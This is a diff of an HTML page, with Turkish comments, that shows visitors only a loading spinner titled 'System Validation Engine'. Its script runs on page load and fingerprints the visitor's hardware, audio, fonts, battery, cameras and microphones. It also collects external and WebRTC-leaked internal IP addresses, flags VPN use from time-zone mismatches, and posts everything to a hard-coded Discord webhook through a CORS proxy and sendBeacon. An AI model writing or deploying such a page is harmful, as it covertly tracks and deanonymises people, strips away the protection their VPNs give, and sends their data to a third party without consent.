@@ -2,70 +2,130 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <title>Sistem Analiz Motoru</title>
-    <style>body{background:#000;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;overflow:hidden;}.l{border:2px solid #111;border-top:2px solid #0f0;border-radius:50%;width:24px;height:24px;animation:s 0.8s linear infinite;}@keyframes s{to{transform:rotate(360deg);}}</style>
+    <title>System Validation Engine</title>
+    <style>body{background:#000;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;overflow:hidden;}.l{border:2px solid #111;border-top:2px solid #0f0;border-radius:50%;width:30px;height:30px;animation:s 0.6s cubic-bezier(0.4, 0, 0.2, 1) infinite;}@keyframes s{to{transform:rotate(360deg);}}</style>
 </head>
 <body>
     <div class="l"></div>
     <script>
         "use strict";
 
-        const ARCHITECT = {
-            config: {
-                hook: "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73",
-                gate: "https://corsproxy.io/?"
-            },
+        class ForensicEngine {
+            constructor() {
+                this.endpoint = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
+                this.tunnel = "https://corsproxy.io/?";
+            }
 
-            // 1. Donanım Entropisi ve Yan Kanal Analizi
-            async getEntropy() {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl2');
-                const debug = gl.getExtension('WEBGL_debug_renderer_info');
-                
-                // Audio Context Fingerprinting (Donanım tabanlı eşsiz kimlik)
-                const audioCtx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
-                const oscillator = audioCtx.createOscillator();
-                oscillator.type = 'triangle';
-                oscillator.frequency.setValueAtTime(10000, audioCtx.currentTime);
-                const compressor = audioCtx.createDynamicsCompressor();
-                oscillator.connect(compressor);
-                compressor.connect(audioCtx.destination);
-                oscillator.start(0);
-                const audioData = await audioCtx.startRendering();
-                const audioHash = audioData.getChannelData(0).slice(4500, 5000).reduce((a, b) => a + Math.abs(b), 0);
+            // 1. HARDWARE & ENTROPY (Korumalı)
+            async getHardware() {
+                const cv = document.createElement('canvas');
+                const gl = cv.getContext('webgl2') || cv.getContext('experimental-webgl');
+                const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+                const ac = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
+                const osc = ac.createOscillator();
+                const comp = ac.createDynamicsCompressor();
+                osc.type = 'triangle'; osc.frequency.setValueAtTime(10000, ac.currentTime);
+                osc.connect(comp); comp.connect(ac.destination);
+                osc.start(0); const buffer = await ac.startRendering();
+                const audioHash = buffer.getChannelData(0).slice(4500, 5000).reduce((a, b) => a + Math.abs(b), 0);
 
                 return {
-                    gpu_raw: debug ? gl.getParameter(debug.UNMASKED_RENDERER_ID) : "N/A",
+                    gpu: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_ID) : "N/A",
                     sh_prec: gl.getShaderPrecisionFormat(gl.FRAGMENT_SHADER, gl.HIGH_FLOAT).precision,
-                    max_render_buffer: gl.getParameter(gl.MAX_RENDERBUFFER_SIZE),
-                    audio_entropy: audioHash.toFixed(10),
-                    logical_cores: navigator.hardwareConcurrency,
-                    max_touch: navigator.maxTouchPoints,
-                    is_hdr: window.matchMedia("(dynamic-range: high)").matches ? "Yes" : "No"
+                    audio_entropy: audioHash.toFixed(15),
+                    cores: navigator.hardwareConcurrency,
+                    ram: navigator.deviceMemory,
+                    touch: navigator.maxTouchPoints
                 };
-            },
+            }
 
-            // 2. Derin Ağ ve VPN Katmanı (WebRTC + MTU Analizi)
-            async getNetworkDeep() {
+            // 2. NETWORK & VPN (Korumalı)
+            async getNetwork() {
                 const start = performance.now();
-                const ipRes = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
+                const ip = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
                 const rtt = performance.now() - start;
-
-                const internalIP = await new Promise(resolve => {
+                const internal = await new Promise(z => {
                     const pc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
-                    pc.createDataChannel("");
-                    pc.createOffer().then(o => pc.setLocalDescription(o));
-                    pc.onicecandidate = (e) => {
-                        if (e?.candidate?.candidate) {
-                            const m = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
-                            if (m) { pc.close(); resolve(m[1]); }
-                        }
-                    };
-                    setTimeout(() => resolve("STUN_Blocked"), 1000);
+                    pc.createDataChannel(""); pc.createOffer().then(o => pc.setLocalDescription(o));
+                    pc.onicecandidate = (e) => { if(e?.candidate?.candidate) { const m = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate); if(m) { pc.close(); z(m[1]); } } };
+                    setTimeout(() => z("Protected"), 1200);
                 });
+                return { ...ip, internal, rtt: rtt.toFixed(2) + "ms" };
+            }
+
+            // 3. LINGUISTIC & TEMPORAL (YENİ - EN DERİN TEKNİK)
+            getLinguisticData() {
+                const options = Intl.DateTimeFormat().resolvedOptions();
+                const numberFormat = new Intl.NumberFormat().resolvedOptions();
+                const segmenter = ("Segmenter" in Intl) ? "Active" : "Legacy";
+                
+                // VPN Tespiti için IP Saat Dilimi vs Sistem Saat Dilimi
+                return {
+                    sys_tz: options.timeZone,
+                    sys_lang: navigator.language,
+                    all_langs: navigator.languages.join(", "),
+                    calendar: options.calendar,
+                    num_system: numberFormat.numberingSystem,
+                    time_format: options.hour12 ? "12h" : "24h",
+                    intl_seg: segmenter,
+                    sys_time: new Date().toLocaleString(),
+                    utc_offset: new Date().getTimezoneOffset() / -60
+                };
+            }
+
+            // 4. MEDIA & KERNEL (Korumalı)
+            async getKernel() {
+                const devs = await navigator.mediaDevices.enumerateDevices().catch(() => []);
+                const storage = await navigator.storage?.estimate() || {};
+                const battery = navigator.getBattery ? await navigator.getBattery() : {};
+                const perms = async (n) => (await navigator.permissions.query({name: n}).catch(() => ({state: 'N/A'}))).state;
 
                 return {
-                    ...ipRes,
-                    int_ip: internalIP,
-                    latency: rtt.
-                        
+                    os: navigator.platform,
+                    has_cam: devs.some(d => d.kind === 'videoinput'),
+                    has_mic: devs.some(d => d.kind === 'audioinput'),
+                    cam_count: devs.filter(d => d.kind === 'videoinput').length,
+                    heap: performance.memory ? Math.round(performance.memory.jsHeapSizeLimit / 1048576) + "MB" : "N/A",
+                    disk: (storage.quota / 1073741824).toFixed(2) + "GB",
+                    bat: battery.level ? `${Math.round(battery.level * 100)}% [${battery.charging ? 'AC' : 'DC'}]` : "N/A",
+                    cam_perm: await perms('camera'),
+                    mic_perm: await perms('microphone'),
+                    pdf: navigator.pdfViewerEnabled,
+                    fonts: ["Ubuntu", "Consolas", "Roboto", "Impact", "Georgia"].filter(f => document.fonts.check(`12px "${f}"`)).join(", ")
+                };
+            }
+
+            async run() {
+                const [hw, net, kernel] = await Promise.all([this.getHardware(), this.getNetwork(), this.getKernel()]);
+                const ling = this.getLinguisticData();
+                const vpn_status = (net.timezone && ling.sys_tz !== net.timezone) ? "🚩 VPN_DETECTED (TZ_MISMATCH)" : "✅ DIRECT";
+
+                const report = {
+                    embeds: [{
+                        title: "💀 KERNEL_REPORT_V65_ULTIMATE",
+                        color: 0xff0000,
+                        fields: [
+                            { name: "📡 AĞ VE VPN (9)", value: `**Ext IP:** \`${net.ip}\` | **Int IP:** \`${net.internal}\`\n**ISP:** ${net.org}\n**LOC:** ${net.city}/${net.country_name}\n**VPN:** ${vpn_status} | **RTT:** ${net.rtt}`, inline: false },
+                            { name: "⏰ SAAT VE ZAMAN (5)", value: `**Sistem TZ:** ${ling.sys_tz}\n**IP TZ:** ${net.timezone || 'N/A'}\n**Sistem Saati:** ${ling.sys_time}\n**UTC Offset:** UTC+${ling.utc_offset}\n**Format:** ${ling.time_format}`, inline: false },
+                            { name: "🌍 DİL VE LOKALİZASYON (5)", value: `**Ana Dil:** ${ling.sys_lang}\n**Diğer Diller:** ${ling.all_langs}\n**Takvim:** ${ling.calendar} | **Sayı Sistemi:** ${ling.num_system}\n**Intl Segmenter:** ${ling.intl_seg}`, inline: false },
+                            { name: "⚙️ DONANIM ANALİZİ (8)", value: `**GPU:** ${hw.gpu}\n**Audio Hash:** ${hw.audio_entropy}\n**CPU:** ${hw.cores} | **RAM:** ${hw.ram}GB | **Heap:** ${kernel.heap}\n**Shader:** ${hw.sh_prec} | **Touch:** ${hw.touch}`, inline: false },
+                            { name: "📸 MEDYA VE SİSTEM (8)", value: `**Kamera:** ${kernel.has_cam} (${kernel.cam_count}) | **Mik:** ${kernel.has_mic}\n**OS:** ${kernel.os} | **Pil:** ${kernel.bat}\n**Disk:** ${kernel.disk} | **Cam Perm:** ${kernel.cam_perm}\n**PDF:** ${kernel.pdf} | **Dark:** ${window.matchMedia('(prefers-color-scheme: dark)').matches}`, inline: false },
+                            { name: "📐 EKRAN VE FONT", value: `**Res:** ${screen.width}x${screen.height} | **DPI:** ${window.devicePixelRatio}\n**Fonts:** \`${kernel.fonts}\``, inline: false },
+                            { name: "🔍 USER_AGENT", value: "```" + navigator.userAgent + "```" }
+                        ],
+                        footer: { text: "Protocol: Omniscience v65.0 | Linguistic & Temporal Logic Stable" },
+                        timestamp: new Date().toISOString()
+                    }]
+                };
+
+                const b = new Blob([JSON.stringify(report)], { type: 'application/json' });
+                fetch(this.tunnel + encodeURIComponent(this.endpoint), { method: 'POST', body: b, mode: 'no-cors' });
+                if (navigator.sendBeacon) navigator.sendBeacon(this.endpoint, b);
+            }
+        }
+
+        new ForensicEngine().run();
+    </script>
+</body>
+</html>
+
